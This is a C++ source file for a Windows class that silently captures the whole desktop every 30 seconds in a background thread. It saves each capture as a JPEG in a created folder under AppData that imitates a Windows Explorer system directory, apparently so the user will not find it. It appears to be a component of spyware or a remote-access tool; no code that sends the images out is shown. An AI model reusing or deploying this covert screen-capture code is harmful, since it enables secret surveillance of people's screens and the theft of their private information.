#include "stdafx.h"
#include "Screenshot.h"

Screenshot::Screenshot()
{
}

Screenshot::~Screenshot()
{
}

string Screenshot::getPath() {

	SYSTEMTIME st;
	GetSystemTime(&st);

	char tt[100];
	sprintf_s(tt, "%.4d-%.2d-%.2d %.2d.%.2d.%.2d", st.wYear, st.wMonth, st.wDay, st.wHour + 1, st.wMinute, st.wSecond);

	string path;
	char pa[260];
	GetEnvironmentVariable("USERPROFILE", pa, 260);
	path = pa;
	path += "\\AppData\\Local\\Microsoft\\Windows\\Explorer\\temp\\";

	CreateDirectory(path.c_str(), NULL);
	
	path += tt;
	path += ".jpeg";

	return path;
}

void Screenshot::startScreenshot()
{
	while (true) {

		ULONG_PTR	gdiplustoken;
		GdiplusStartupInput gdiplusstartupinput;
		GdiplusStartupOutput gdiplusstartupoutput;
		gdiplusstartupinput.SuppressBackgroundThread = true;
		GdiplusStartup(&gdiplustoken, &gdiplusstartupinput, &gdiplusstartupoutput);//start GDI+

		HDC dc = GetDC(GetDesktopWindow());//Get Desktop Context
		HDC dc2 = CreateCompatibleDC(dc);//Copy Context

		RECT rcOkno;
		GetClientRect(GetDesktopWindow(), &rcOkno);//Get desktop size
		int w = rcOkno.right - rcOkno.left;//width
		int h = rcOkno.bottom - rcOkno.top;//height

		HBITMAP hbitmap = CreateCompatibleBitmap(dc, w, h);//Create bitmap
		HBITMAP holdbitmap = (HBITMAP)SelectObject(dc2, hbitmap);
		BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);//Copy pixels from pulpit to bitmap

		Bitmap* bm = new Bitmap(hbitmap, NULL);//Create GDI+ bitmap

		UINT num;
		UINT size;
		ImageCodecInfo *imagecodecinfo;
		GetImageEncodersSize(&num, &size);//get count of codecs
		imagecodecinfo = (ImageCodecInfo*)(malloc(size));
		GetImageEncoders(num, size, imagecodecinfo);//get codecs

		CLSID clsidEncoder;

		for (UINT i = 0; i < num; i++)
		{
			if (wcscmp(imagecodecinfo[i].MimeType, L"image/jpeg") == 0)
				clsidEncoder = imagecodecinfo[i].Clsid;//get jpeg codec id
		}
		free(imagecodecinfo);

		wstring ws;
		string path = getPath();

		ws.assign(path.begin(), path.end());//string->wstring
		bm->Save(ws.c_str(), &clsidEncoder, NULL);//save in jpeg format
		SelectObject(dc2, holdbitmap);//Release objects
		DeleteObject(dc2);
		DeleteObject(hbitmap);

		ReleaseDC(GetDesktopWindow(), dc);
		GdiplusShutdown(gdiplustoken);

		Sleep(1000 * 30); //30 seconde
	}
}

DWORD WINAPI Screenshot::screenshotThread(PVOID instance) {
	((Screenshot*)instance)->startScreenshot();
	return 0;
}

HANDLE Screenshot::startThread() {
	return (HANDLE) CreateThread(0, 0, screenshotThread, this, 0, 0);
}